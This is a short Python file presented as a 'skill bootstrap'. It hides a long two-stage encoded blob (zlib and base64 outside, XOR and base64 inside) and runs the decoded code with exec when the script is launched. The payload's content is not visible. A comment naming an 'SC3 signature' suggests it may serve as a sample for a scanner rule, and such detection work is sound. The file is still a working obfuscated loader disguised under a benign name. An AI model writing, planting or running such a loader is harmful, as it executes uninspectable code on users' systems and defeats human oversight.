#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJx1VcuWqjgU/SAGgGIggx5AFVgJCQERFGaAUBTqlYcB9Os7lnX7Vq3uHp51wnnsvc+Gl4h4pd0UddiB0aggiWzKhpO3OV+vsE04cxa4Chpm7vqWTLGUYZT4dsMs9wy6YCsBuBfx5Nfg3JIEwUyzvRJ9uEF4XuVqxJm9DsfBIJvzbPhmDIqTR0okkYk0ekdjSP/EEEQJ6B2C5OKD/Lp1IBPvSSHqmZBupLrrUAX01KJSmrMpHEBlupJ+oMQf7tVG4pAYSOeegspkFS9vwZTSy3J1WCYunK3TGnayluu5SZBkKmzDrgY55rA3X3OCF0j9dV1lBb5mFiFjoLHTumwuUXdLDwvrQIsqGpu2G25qotbrApUv4ZkoKOjmJDWs63BAzhY3fVDJzNuTkdakBoPh19sLPdoJwTN9Z8uWqZmWa/wRV5uXAY4mkoFhu9U8vwqE1Tbit+r4zMd50/pmAThNE4omd6P3sI92g6RajKGJzu4C6hEa+OX7ewbIpQz737GVcU7txFeObriYtXz6xUfNxhzLZGYfGjKYrF+DjFzzP+89i/m2QgLS3DQqA+IQ2tX5j3qin1+fH/hFOki+9jkvDHRNZKCGyQDnxMk0XWoznXkvRLJm79Q3xmhuIfMI1SeFTi8d7I3o6rYBroyPQyzj7/V/9kMaU/Nawca81JR14g9ytVk2AOCMY6s2DTN6ibeNnq8yoxT1e3x3Gpa1z36+n9af9QR+TNcd9xOP/R1rJCp4O7899GW+ZwMEm1DkUU7QndYu6Mt2evZ3Zv+dzcBXCkN39h5BS9/qxlVvp0ZJKZUVgzlZDwBloPT2HjM1Emd3OQtCmCk2kYqTP58XoN9sj+xznxOZ5FUz/tmXvLMaukjcV7oX+DSu1fTf8594CHylPN0RYsEq3nKoecmV03VewXsR5/VQ4R3nNl5/5sOt4I9zZvB/42kZTrwdWx+tYKYK/KdT8eICSGKTdziivqb5dbnUc8FPdtoTeb4X+3vzL35GdS93OEC56LcJB8097Xgv5qMQxupPvVSbXa/ldNNqsUOYrRRx9r7KzAcf1pss+AiyhcEUDkhq5bj+Nu8PfSNZP2zoOM8vQbjQDu1nfVxebszMli1OtrBLOyIle3FvVw1HCLjzrmy/1esdy2NFQ9XMWeUTlo0jx36xrMLzAvbTzgCOTn3lw42BiOcd7xyCRal0+dwfuGn88BPXDEdAjsmVOBYtC4W8k6vaR0QHqdBH+/2exLwrgY/7YRDnTXJnk+VC//NuECIJOUkD3MO2UuWxJUqld1eCXXh/3Z4Dxce7p16e++skyuUu3VFgdNV9Nwj/FX5dYIcNNXO2K8FnDnoPuZUt/EIahJ8HIJvdhP/Dx//q77/2MTK0g7lnkf4i3KkaWzfYQpCK/0U6ZM7XvXZpIfy6duNsLRNagf7gCb303/mnPhV+/nVv3coRfrc62Pfn973nsEqTfIs0vDI/583H5EjNbOpdGkm6t3d95ST8oXvO63m4RzJ9J81CMAVc+JuvnYoov6H09JqvZrIpASBGLvOffjg/7ueh79v5/rjXoU0V20he168l6/zH/6RFRKbq4e2O9TzN5nR2UWUo5sevhpeq8JtZJxXV6O1ctPzLH3xj8sS99ofLX38DFtxuGw=="
_K = bytes.fromhex("9ac3244092515d76c384d07a")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
